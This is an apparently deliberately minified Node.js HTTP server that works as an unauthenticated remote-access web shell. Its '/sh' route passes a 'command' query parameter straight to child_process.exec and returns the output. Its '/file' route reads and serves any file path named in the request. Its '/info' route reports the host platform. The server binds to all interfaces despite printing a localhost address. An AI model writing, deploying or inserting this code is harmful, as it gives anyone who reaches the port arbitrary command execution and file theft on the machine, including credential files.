import{argv,exit,platform,arch}from"node:process";import{promisify,styleText}from"node:util";import{readFile}from"node:fs/promises";import{exec}from"node:child_process";import{extname}from"node:path";import{Server}from"node:http";(class{static init=()=>{const e=(e,t)=>(this.#e(e,t),"GET"!==e.method?t.writeHead(404).end():e.url?.includes("/sh")?this.#t(e,t):e.url?.includes("/file")?this.#i(e,t):e.url?.includes("/info")?this.#n(e,t):e.url?.includes("/status")?t.writeHead(204).end():t.writeHead(404).end()),t=void 0===(i=argv[2])||isNaN(+i)?0:+i;var i;try{const{port:i}=(new Server).on("request",e).listen(t,(()=>console.info(styleText(["bold","green"],`\n[*] Server: http://127.0.0.1:${i}`)))).address();process.on("SIGINT",this.#o),process.on("SIGTERM",this.#o)}catch(e){console.trace(e),this.#o()}};static#e=({method:e,url:t},i)=>{const n=Date.now(),o=styleText(["bgWhite","bold","black"],`[${e}]`),s=styleText(["blue","bold"],`${t}`);i.on("finish",(()=>{const e=Date.now()-n;console.log(`${o} - ${s} - ${i.statusCode} - ${e}ms`)}))};static#n=(e,t)=>(t.writeHead(200,this.#s("plain")).write(`${platform} ${arch}`),t.end());static#t=async(e,t)=>{const{command:i}=this.#r(e.url);if(void 0===i)return t.writeHead(400).end();try{const{stderr:e,stdout:n}=await promisify(exec)(i);t.writeHead(200,this.#s("plain")).write(`${n} \n\n${e}`)}catch(e){t.writeHead(400,this.#s("json")).write(JSON.stringify(e))}return t.end()};static#i=async(e,t)=>{const{name:i}=this.#r(e.url);if(void 0===i)return t.writeHead(400).end();try{const e=this.#s(extname(i));t.writeHead(200,e).write(await readFile(i))}catch(e){console.trace(e),t.writeHead(400).write(e)}return t.end()};static#r=e=>{const[t,i]=e.split("?");if(void 0===i)return{query:{}};const n=new URL("https://example.com"+e),o=new URLSearchParams(n.search);return Object.fromEntries(o.entries())};static#s=e=>{let t;return t=e.includes(".")?this.#a[e.split(".").pop()]:this.#a[e],void 0!==t?{"Content-Type":t}:void 0};static#a={pptx:"application/vnd.openxmlformats-officedocument.presentationml.presentation",docx:"application/vnd.openxmlformats-officedocument.wordprocessingml.document",xlsx:"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",zip:"application/zip",pdf:"application/pdf",json:"application/json",xml:"application/xml",plain:"text/plain",txt:"text/plain",html:"text/html",css:"text/css",png:"image/png",jpg:"image/jpg",jpeg:"image/jpeg",gif:"image/gif",svg:"image/svg+xml",webp:"image/webp",mp3:"audio/mp3",wav:"audio/wav",ogg:"audio/ogg",mp4:"video/mp4",mkv:"video/mkv",webm:"video/webm",avi:"video/x-msvideo"};static#o=()=>{console.info(styleText(["bold","red"],"\n\n[!] Stopping server.")),exit(1)}}).init();